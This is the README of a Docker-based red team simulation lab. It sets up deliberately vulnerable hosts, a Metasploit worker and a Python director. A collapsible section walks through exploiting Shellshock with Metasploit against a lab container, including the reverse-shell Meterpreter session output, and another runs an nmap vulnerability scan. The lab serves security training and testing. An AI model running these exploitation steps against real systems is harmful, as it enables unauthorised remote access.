# redteam

Red Team simulation

## Components

- Postgres database
- Vulnerable hosts:
  - Apache httpd vulnerable to shellshock
  - DVWA (Damn Vulnerable Web Application)
  - vsftpd with an infamous backdoor
- Metasploit RPC api (red team worker)
- Python director (red team director)
- Metasploit console (for debugging)




## Requirements

1. Install docker and docker-compose




## Usage

1. Start the database: `docker-compose -f docker-compose-db.yml up -t 2`
   (persistence is disabled, removing the container will reset the data)
1. Start director and workers: `docker-compose -f docker-compose-workers.yml up -t 2`
1. Start the director: `docker-compose up --build -t 2`


## Development

### Coding

Use one branch per feature so we can merge in small change increments: `git checkout main && git pull && git checkout -b my-branch-name`

### Run tests

```docker-compose -f docker-compose-tests.yml up --build```

### Using your local python

You should normally use `docker-compose up` instead of running your own python, but if for some reason you need local development:

```
pip install --user pipenv
cd redteam/director
pipenv shell
pipenv install
python -u director/main.py
```



## Manual use of metasploit

If you want to debug the state of the database or perform 
manual actions in metasploit, you can connect to the
msfconsole by ```docker attach redteam_msfconsole_1```


<details>
  <summary>Remote code execution exploiting Shellshock</summary>

### Example attack


Scan the hostname "target2"
```
> db_nmap target2
```

Check that the host is now in the database
```
> hosts
Hosts
=====

address     mac                name                               os_name  os_flavor  os_sp  purpose  info  comments
-------     ---                ----                               -------  ---------  -----  -------  ----  --------
172.19.0.3  02:42:ac:13:00:03  redteam_target2_1.redteam_default  Unknown                    device         
```

Check which services are now in the database
```
> services
Services
========

host        port  proto  name   state  info
----        ----  -----  ----   -----  ----
172.19.0.3  80    tcp    http   open 
```

Let's assume you expect the host to be vulnerable to shellshock, let's exploit it:
```
> use exploit/multi/http/apache_mod_cgi_bash_env_exec
> show options
> set RHOSTS target2
> set TARGETURI /cgi-bin/stats
```

Run the exploit:
```
> exploit

[*] Started reverse TCP handler on 172.19.0.6:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (976712 bytes) to 172.19.0.3
[*] Meterpreter session 1 opened (172.19.0.6:4444 -> 172.19.0.3:60846) at 2020-11-04 12:52:22 +0000

meterpreter >
```

Profit!


</details>


<details>
  <summary>Vulnerability scanning</summary>

```
  mkdir -p $HOME/.nmap/scripts && wget -O $HOME/.nmap/scripts/vulners.nse 'https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse' && nmap --script-updatedb
  nmap -sV --script vulners  --script-args mincvss=6.0 target1
```
</details>
